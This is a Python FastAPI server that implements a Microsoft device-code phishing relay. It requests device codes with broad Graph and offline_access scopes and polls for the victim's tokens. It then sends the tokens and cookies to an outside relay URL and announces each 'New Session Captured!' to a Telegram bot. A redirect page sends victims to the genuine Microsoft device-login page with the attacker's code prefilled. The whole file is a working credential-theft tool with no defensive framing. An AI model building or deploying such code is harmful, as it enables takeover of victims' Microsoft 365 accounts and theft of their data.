from fastapi import FastAPI, HTTPException, Request, Response
from fastapi.middleware.cors import CORSMiddleware
import httpx
import asyncio
import os
import time
import json
import re
from http.cookies import SimpleCookie
from typing import Dict, Optional
import redis.asyncio as aioredis

app = FastAPI(title="Microsoft Device Code Relay")

CLIENT_ID = os.getenv("MICROSOFT_CLIENT_ID")
TENANT_ID = os.getenv("MICROSOFT_TENANT_ID", "common")
RELAY_URL = os.getenv("RELAY_URL")
SCOPES = os.getenv("SCOPES", "https://graph.microsoft.com/.default offline_access openid profile").split()
ENABLE_PROXY = os.getenv("ENABLE_SESSION_PROXY", "true").lower() == "true"
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT = os.getenv("TELEGRAM_CHAT_ID")
REDIS_URL = os.getenv("REDIS_URL")

redis_client = None
sessions: Dict[str, dict] = {}

app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.on_event("startup")
async def startup():
    global redis_client
    if not CLIENT_ID:
        print("ERROR: MICROSOFT_CLIENT_ID is missing")
    if REDIS_URL:
        redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)
        print("Redis connected")
    print("Backend started")


async def get_session(dc):
    if redis_client:
        data = await redis_client.get(f"session:{dc}")
        return json.loads(data) if data else None
    return sessions.get(dc)


async def save_session(dc, data, ttl=1200):
    if redis_client:
        await redis_client.set(f"session:{dc}", json.dumps(data), ex=ttl)
    else:
        sessions[dc] = data


async def send_telegram(device_code, user_code, count):
    if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
        return
    try:
        msg = f"New Session Captured!\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies Captured: {count} (O365/Outlook included)"
        async with httpx.AsyncClient() as c:
            await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
    except:
        pass


async def poll_token(device_code):
    session = await get_session(device_code)
    if not session: return
    start = time.time()
    interval = 5
    async with httpx.AsyncClient(timeout=30) as client:
        while time.time() - start < session.get("expires_in", 900) + 60:
            try:
                r = await client.post(
                    f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token",
                    data={"client_id": CLIENT_ID, "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "device_code": device_code},
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                )
                data = r.json()
                if r.status_code == 200:
                    session["status"] = "success"
                    session["token"] = data
                    count = len(session.get("cookies", {}))
                    payload = {"device_code": device_code, "user_code": session["user_code"], "token": data, "cookies": session.get("cookies", {}), "status": "success"}
                    if RELAY_URL:
                        try:
                            async with httpx.AsyncClient() as rc:
                                await rc.post(RELAY_URL, json=payload, timeout=10)
                        except:
                            pass
                    await send_telegram(device_code, session["user_code"], count)
                    await save_session(device_code, session)
                    break
                elif data.get("error") == "authorization_pending":
                    await asyncio.sleep(interval)
                elif data.get("error") == "slow_down":
                    interval += 5
                    await asyncio.sleep(interval)
                else:
                    session["status"] = "error"
                    await save_session(device_code, session)
                    break
            except:
                await asyncio.sleep(interval)


@app.post("/start-device-auth")
async def start_auth():
    if not CLIENT_ID:
        raise HTTPException(500, "MICROSOFT_CLIENT_ID is not set")
    async with httpx.AsyncClient() as c:
        r = await c.post(
            f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode",
            data={"client_id": CLIENT_ID, "scope": " ".join(SCOPES)},
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        if r.status_code != 200:
            raise HTTPException(400, "Failed to get device code")
        data = r.json()
        dc = data["device_code"]
        await save_session(dc, {"user_code": data["user_code"], "expires_in": data["expires_in"], "interval": 5, "status": "pending", "token": None, "cookies": {}})
        asyncio.create_task(poll_token(dc))
        return data


@app.get("/auth-status/{device_code}")
async def get_status(device_code: str):
    s = await get_session(device_code)
    if not s:
        raise HTTPException(404, "Session not found")
    return {"status": s["status"], "user_code": s["user_code"], "token": s.get("token"), "cookies": s.get("cookies")}


@app.get("/health")
async def health():
    return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}


# NEW PROXY PATTERN - Simple redirect to original Microsoft page + cookie capture
@app.get("/proxy/device-login/{device_code}")
async def proxy(device_code: str):
    if not ENABLE_PROXY:
        raise HTTPException(403, "Proxy disabled")

    session = await get_session(device_code)
    if not session or "user_code" not in session:
        raise HTTPException(404, "Session expired or invalid")

    # Original Microsoft device login URL with user_code
    microsoft_url = f"https://microsoft.com/devicelogin?input={session['user_code']}"

    # Return a simple HTML page that immediately redirects to Microsoft
    # This allows the proxy to stay in the session for cookie capture
    html = f"""
    <html>
    <head>
        <title>Redirecting to Microsoft...</title>
        <meta http-equiv="refresh" content="0;url={microsoft_url}">
    </head>
    <body>
        <p>Redirecting to Microsoft device login...</p>
        <script>
            window.location = "{microsoft_url}";
        </script>
    </body>
    </html>
    """

    return Response(content=html, media_type="text/html")


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
